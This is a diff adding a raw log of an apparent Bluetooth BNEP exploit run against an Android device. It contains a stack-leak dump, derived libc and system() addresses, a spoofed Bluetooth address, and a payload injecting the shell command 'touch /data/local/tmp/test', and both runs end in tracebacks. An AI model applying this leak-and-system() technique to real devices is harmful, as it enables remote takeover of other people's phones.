@@ -1,0 +1,57 @@
+Not connected.
+[*] Pwn attempt 0:
+[*] Set hci0 to new rand BDADDR 4c:6f:a6:1d:d1:fd
+[◤] Doing stack memeory leak...
+00: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
+01: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
+02: 00000000 00000000 00000000 00000018 00000042 ad13bcd4 9a8e32c0 00000018 acff9fdd 
+03: acff3f45 ad13bcd4 a7b787e0 4c6fa61d 0000d1fd 00000000 00000970 2030b6e9 b4380500 
+04: 000003f4 9a8e329c b529a008 00020001 ad060700 9a8e3358 ad0581b3 00000017 b5257901 
+05: 00000970 b4380500 b4380500 b4380970 a7b7a4b8 b52655d1 00000000 000003f4 00000000 
+06: a7b7a830 b3e38540 b3e38548 b2f46fa0 00000008 00000000 b5274059 00000001 00000000 
+07: 00000000 00000000 0000000e ad00cc1c 2030b6e9 00000008 a7b7a830 b2f46fa0 ad0746c0 
+08: b2f46fa0 00000000 a7b65960 a7b7a830 b2f46fa0 ad0746c0 ad004433 a7b7a290 a7b7a830 
+09: a7b00000 b4380500 00000003 a7b6a560 a7b00000 b4380500 b4380a78 b3e38548 00000000 
+10: a7b6a580 0000000f b526630b a7b6a434 0000006a 0000006a b3e38548 b4380500 b5266337 
+11: acfeab11 ad1254c8 00000000 a7b6a5a0 0000003e b52760a5 0000006a a7b6a5a0 b3e38548 
+12: 0000003e 00000970 b4380500 b4380500 b4380970 2030b6e9 a7b6a5e0 00000042 0000003e 
+13: 00000042 a7b6a610 00000000 a7b6a600 0000000f acfea9ad ad13bcd4 a7b6a600 00000042 
+14: acff3c5b 9a8e34b0 a7b65f78 a7b66224 b526630b 00000970 0000007a 0000007a b3e38548 
+15: b4380500 b5266337 9a8e34b0 a7b6a640 ad13a8cc a7b7a6a0 00000000 b52760a5 0000007a 
+16: a7b7a6a0 b3e38548 00000000 9a8e38d8 00000000 9a8e34b0 b52762d3 00000000 9a8e34b0 
+17: 2030b6e9 00000008 a7b7a838 2030b6e9 a7b65ac8 a7b7a6a0 00000000 9a8e38d8 00000000 
+18: 9a8e34b0 00000001 00000000 00000001 ad0052cf 2030b6e9 a7b65f80 00000001 a7b66218 
+19: 9a8e38d8 00000000 9a8e34b0 a7b65f78 a7b66224 ad004ac1 00000001 0000003e a7b66218 
+[*] LIBC  0xa7b7a6a0
+[*] BT    0xacff9fdd
+[*] libc_base: 0xa7ad233f, bss_base: 0xacf7a960
+[*] system: 0xa7ba6e8c, acl_name: 0xad12df6c
+[*] Set hci0 to new rand BDADDR 46:b5:9a:3a:9d:63
+[*] system    0xa7ba6e8c
+[*] PAYLOAD "\x17\xaa\xaaAAAA\x8cn\xba\xa7";
+    touch /data/local/tmp/test
+    #
+[+] Connecting to BNEP again: Done
+[←] Pwning...
+Traceback (most recent call last):
+  File "/home/.../exp4.py", line 209, in <module>
+    main(*sys.argv[1:])
+  File "/home/.../exp4.py", line 205, in main
+    pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, libc_text_base)
+  File "/home/.../exp4.py", line 166, in pwn
+    log.info(bnep.getpeername())
+  File "<string>", line 5, in getpeername
+bluetooth.btcommon.BluetoothError: (107, 'Transport endpoint is not connected')
+
+
+Not connected.
+[*] Pwn attempt 0:
+[*] Set hci0 to new rand BDADDR 76:ae:f7:32:8d:16
+Traceback (most recent call last):
+  File "/home/.../exp4.py", line 209, in <module>
+    main(*sys.argv[1:])
+  File "/home/.../exp4.py", line 186, in main
+    src = set_rand_bdaddr(src_hci)
+  File "/home/.../exp4.py", line 81, in set_rand_bdaddr
+    time.sleep(0.1)
+KeyboardInterrupt
